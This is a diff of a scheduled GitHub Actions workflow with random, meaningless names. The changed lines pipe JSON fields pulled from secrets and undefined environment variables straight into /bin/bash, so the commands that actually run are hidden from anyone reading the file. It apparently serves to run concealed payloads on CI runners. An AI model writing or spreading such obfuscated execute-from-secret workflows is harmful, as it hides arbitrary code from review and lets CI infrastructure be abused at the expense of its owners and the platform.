@@ -3,7 +3,7 @@ name: wangyinzi1234
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 4/6 * * *'
+    - cron: '47 4/6 * * *'
 
 jobs:
   build:
@@ -12,20 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: wangyinzi1234
         env:
-          dco404: ${{ secrets.dco404 }}
+          gymn9: ${{ secrets.gymn9 }}
         run: |
-          echo $dco404 | jq -r .ezya7 | /bin/bash
-          echo $k74 | jq -r .qf3 | /bin/bash
-          echo $ytok053 | jq -r .hhf9344 | /bin/bash
-          echo $wk2 | jq -r .b525 | /bin/bash
-          echo $zkrr5 | jq -r .bw21582 | /bin/bash
-          echo $v6074 | jq -r .feu96407 | /bin/bash
-          echo $nozlr62 | jq -r .xtept90625 | /bin/bash
-          echo $vwvih11890 | jq -r .vmqkp4487 | /bin/bash
-          echo $hcs0032 | jq -r .pdadm87102 | /bin/bash
-          echo $u74393 | jq -r .pp5043 | /bin/bash
-          echo $e080 | jq -r .yasux56 | /bin/bash
-          echo $oiaxy8441 | jq -r .w47 | /bin/bash
-          echo $wet9 | jq -r .hdwsz12 | /bin/bash
-          echo $qajh3761 | jq -r .oysqu9217 | /bin/bash
+          echo $gymn9 | jq -r .bxuu945 | /bin/bash
+          echo $hnc4744 | jq -r .qu4 | /bin/bash
+          echo $c85 | jq -r .okkk3 | /bin/bash
+          echo $znb16 | jq -r .b8 | /bin/bash
+          echo $xs9662 | jq -r .cb2 | /bin/bash
+          echo $a27272 | jq -r .l9 | /bin/bash
+          echo $ugvjn8 | jq -r .rnp77 | /bin/bash
+          echo $scltx1 | jq -r .k708 | /bin/bash
+          echo $tdccb86 | jq -r .acy198 | /bin/bash
+          echo $ab3 | jq -r .vu07992 | /bin/bash
+          echo $rqu2461 | jq -r .ql5 | /bin/bash
 
